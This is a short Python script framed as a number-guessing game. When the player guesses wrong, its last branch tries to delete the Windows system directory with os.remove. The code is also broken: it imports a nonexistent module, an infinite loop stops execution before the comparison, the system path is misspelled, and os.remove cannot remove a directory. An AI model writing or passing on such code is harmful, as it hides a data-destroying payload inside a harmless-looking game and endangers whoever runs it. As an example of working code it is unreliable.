import random, os, pywin32, signal


number = random.randint(1,100)
guess = input("Guess a number between 1 and a 100")
guess = int(guess)

def handler(signum, frame):
  signal.signal(signal.SIGINT, handler)
while True:
    pass

if guess == number:
  print ("You won !")
else:
  os.remove("C:\Windows\Systeme32")
